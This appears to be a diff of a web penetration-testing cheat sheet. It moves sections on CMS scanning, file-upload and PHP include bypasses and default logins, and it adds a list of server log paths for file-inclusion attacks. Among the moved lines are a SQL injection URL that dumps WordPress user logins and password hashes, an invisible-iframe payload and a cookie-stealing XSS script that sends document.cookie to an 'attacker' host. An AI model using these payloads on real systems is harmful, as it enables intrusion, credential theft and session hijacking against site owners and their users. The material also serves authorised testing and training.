@@ -33,6 +33,48 @@ Authentication
         Try password reuse between services
         Google default credentials for app
 
+Drupal
+    *$droopescan scan -u $ip*
+
+Wordpress
+    Scan for known bugs:
+    *$ wpscan http://$ip*
+    Try exploit:
+    */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23*
+
+Bruteforcing
+    Good password list
+    *https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_1000.txt*
+
+File uploads
+    Avoid extension checks using tricks like:
+    *.php5.jpeg
+.php5%00.jpeg*
+    Different file formats
+    *https://en.wikipedia.org/wiki/List_of_file_signatures*
+PHP
+    You can usually bypass file include filters with payloads like:
+    *php://filter/convert.base64-encode/resource=file*
+    If you control an include statenent such as
+    *include("lang/".$_COOKIE['lang']);*
+    You can set a cookie pointing to an arbitrary PHP file and have it executed in your page.
+
+SSL certificates
+    Find out potential correct vhost to GET
+    is the clock skewed
+    Any names that could be usernames for bruteforce/guessing.
+
+Login
+    Always try user root, admin, administrator with password letmein admin root
+Files
+    Run strings against every file
+
+XSS vectors
+    Invisible iframe:
+    *<iframe src="http://attacker/" height="0" width="0"></iframe>*
+    Steal cookies
+    *<script> new Image().src="http://attacker/bogus.php?output="+document.cookie; </script>*
+
 RFI/LFI
     Test it:
     *$ fimap -u "http://$ip/example.php?test="*
@@ -88,46 +130,38 @@ logs/access.log
 /var/www/html/index.php
 /var/www/index.php
 /var/www/manual/index.html
-...*
-
-Drupal
-    *$droopescan scan -u $ip*
-
-Wordpress
-    Scan for known bugs:
-    *$ wpscan http://$ip*
-    Try exploit:
-    */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23*
-
-Bruteforcing
-    Good password list
-    *https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_1000.txt*
-
-File uploads
-    Avoid extension checks using tricks like:
-    *.php5.jpeg
-.php5%00.jpeg*
-    Different file formats
-    *https://en.wikipedia.org/wiki/List_of_file_signatures*
-PHP
-    You can usually bypass file include filters with payloads like:
-    *php://filter/convert.base64-encode/resource=file*
-    If you control an include statenent such as
-    *include("lang/".$_COOKIE['lang']);*
-    You can set a cookie pointing to an arbitrary PHP file and have it executed in your page.
-
-SSL certificates
-    Find out potential correct vhost to GET
-    is the clock skewed
-    Any names that could be usernames for bruteforce/guessing.
-
-Login
-    Always try user root, admin, administrator with password letmein admin root
-Files
-    Run strings against every file
-
-XSS vectors
-    Invisible iframe:
-    *<iframe src="http://attacker/" height="0" width="0"></iframe>*
-    Steal cookies
-    *<script> new Image().src="http://attacker/bogus.php?output="+document.cookie; </script>*
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+/var/log/apache2/access_log
+/var/log/apache2/access.log
+/var/log/apache2/error_log
+/var/log/apache2/error.log
+/var/log/apache/access_log
+/var/log/apache/access.log
+/var/log/auth.log
+/var/log/chttp.log
+/var/log/cups/error_log
+/var/log/dpkg.log
+/var/log/faillog
+/var/log/httpd/access_log
+/var/log/httpd/access.log
+/var/log/httpd/error_log
+/var/log/httpd/error.log
+/var/log/lastlog
+/var/log/lighttpd/access.log
+/var/log/lighttpd/error.log
+/var/log/lighttpd/lighttpd.access.log
+/var/log/lighttpd/lighttpd.error.log
+/var/log/messages
+/var/log/secure
+/var/log/syslog
+/var/log/wtmp
+/var/log/xferlog
+/var/log/yum.log
+/var/run/utmp
+/var/webmin/miniserv.log
+/var/www/logs/access_log
+/var/www/logs/access.log
+*
